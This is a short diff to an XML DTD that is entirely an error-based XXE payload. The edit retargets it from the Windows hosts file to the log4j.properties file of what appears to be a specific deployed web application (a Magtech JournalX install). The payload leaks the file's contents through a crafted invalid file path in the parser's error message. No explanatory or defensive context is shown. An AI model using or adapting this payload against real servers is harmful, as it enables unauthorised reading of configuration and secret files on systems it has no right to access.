@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
+<!ENTITY % file SYSTEM "file:///d:/magtech/journalx_dzkjqb/WEB-INF/classes/log4j.properties">
 <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///GG%file;'>">
 %eval;
 %err;
